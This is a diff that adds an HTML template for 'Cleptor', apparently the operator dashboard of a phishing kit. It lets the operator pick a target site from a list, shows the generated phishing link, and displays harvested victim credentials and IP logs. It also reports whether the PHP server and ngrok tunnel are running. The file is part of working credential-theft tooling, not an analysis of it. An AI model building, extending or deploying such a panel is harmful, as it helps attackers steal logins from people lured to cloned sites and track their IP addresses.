@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Cleptor Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      display: flex;
+      font-family: monospace;
+      background-color: #0a0f14;
+      color: #00ff88;
+      height: 100vh;
+    }
+    .tools, .websites {
+      width: 200px;
+      background: #0f0f0f;
+      border-right: 2px solid #00ff88;
+      padding: 1rem;
+    }
+    .main {
+      flex: 1;
+      padding: 1.5rem;
+      overflow-y: auto;
+    }
+    h1, h2, h3 { color: #00ff88; }
+    select, button {
+      width: 100%;
+      padding: 0.5rem;
+      margin-top: 1rem;
+      background: #000;
+      color: #00ff88;
+      border: 1px solid #00ff88;
+    }
+    pre {
+      background: #111;
+      padding: 1rem;
+      border: 1px solid #00ffcc;
+      overflow-x: auto;
+      white-space: pre-wrap;
+    }
+    a {
+      color: #00ffff;
+      word-break: break-word;
+    }
+  </style>
+</head>
+<body>
+  <div class="tools">
+    <h2>🧰 Tools</h2>
+    <a href="/">Phishing</a><br><br>
+    <a href="/logout">Logout</a>
+  </div>
+  <div class="websites">
+    <h3>🎯 Sites</h3>
+    <form method="POST">
+      <select name="site" size="12" onchange="this.form.submit()">
+        {% for site in websites %}
+        <option value="{{ site }}" {% if site == selected %}selected{% endif %}>{{ site }}</option>
+        {% endfor %}
+      </select>
+    </form>
+  </div>
+  <div class="main">
+    <h1>Cleptor Control Panel</h1>
+    <h3>🔗 Phishing URL:</h3>
+    <p><a href="{{ status.selected_link }}" target="_blank">{{ status.selected_link }}</a></p>
+
+    <h3>📥 Credentials:</h3>
+    <pre>{{ creds }}</pre>
+
+    <h3>📍 IP Logs:</h3>
+    <pre>{{ ips }}</pre>
+
+    <h3>⚙️ Status:</h3>
+    <p>PHP: {{ '✅' if status.php else '❌' }}</p>
+    <p>Ngrok: {{ '✅' if status.ngrok else '❌' }}</p>
+  </div>
+</body>
+</html>
